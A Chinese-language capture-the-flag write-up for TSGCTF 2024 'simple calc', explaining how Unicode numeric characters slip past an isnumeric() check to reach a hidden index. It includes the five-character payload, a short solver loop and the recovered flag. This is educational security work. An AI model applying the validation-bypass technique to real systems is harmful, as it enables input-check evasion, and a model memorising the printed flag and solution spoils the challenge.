# TSGCTF2024 simple calc

## 题目简述

服务把 flag 放在一个很长字符串的偏移 12345678 处，并把用户表达式计算结果当作字符索引：

```python
text = '*' * 12345678 + FLAG + '*' * 12345678
print(f'{val} th character is {text[val]}')
```

输入长度必须小于 6，字符只能满足 `c.isnumeric()` 或为 `+*`。普通十进制数字无法在五个字符内表示 12345678，但计算器并没有用 `int(c)`，而是调用 `unicodedata.numeric(c)`。

## 解题过程

Unicode 的 Numeric_Value 不限于 0 到 9；分数和古代计数符号也会通过 `isnumeric()`。官方 solver 使用的前四个字符如下：

| 字符 | Unicode 名称 | Numeric_Value |
| --- | --- | ---: |
| `༬` | TIBETAN DIGIT HALF THREE | 2.5 |
| `⅔` | VULGAR FRACTION TWO THIRDS | $2/3$ |
| `𐄲` | AEGEAN NUMBER EIGHTY THOUSAND | 80000 |
| `𒐳` | CUNEIFORM NUMERIC SIGN SHAR2 TIMES GAL PLUS MIN | 432000 |

没有运算符时，`calc` 逐字符执行：

```python
x = 0
for c in s:
    x = 10 * x + numeric(c)
```

因此前四字符形成约为 1234566.666… 的值，再追加一个 Numeric_Value 为 $v$ 的字符，结果约为：

$$12345666.666\ldots+v$$

服务端随后执行 `int(calc(s))`，向零截断。追加 `⑫`，其 Numeric_Value 为 12，即得到索引 12345678：

```text
༬⅔𐄲𒐳⑫
```

这正好读取 flag 的第一个字符。依次使用 Numeric_Value 为 12 到 50 的圈号/括号数字，每次建立一个新连接并读取一个字符：

```python
numbers = (
    [chr(0x245F + i) for i in range(12, 21)]
    + [chr(0x323C + i) for i in range(21, 36)]
    + [chr(0x328D + i) for i in range(36, 51)]
)

flag = ''
for suffix in numbers:
    send(('༬⅔𐄲𒐳' + suffix).encode())
    flag += recv_one_character()
```

读取索引 12345678 到 12345716，拼出：

```text
TSGCTF{Num63r5_b0w_+o_y0ur_bri11i4nC3!}
```

## 方法总结

本题利用了“Unicode 数字字符”与“十进制数字”的语义差异。`str.isnumeric()` 和 `unicodedata.numeric()` 接受大数及分数，导致一个码点能贡献 80000、432000 等远超单个十进制位的值；浮点分数配合最终 `int()` 截断又让连续索引容易构造。若语法只允许十进制整数，应显式限制 ASCII `0` 到 `9` 并对完整字符串解析，不能把 Unicode 数值属性当作数字字面量词法规则。
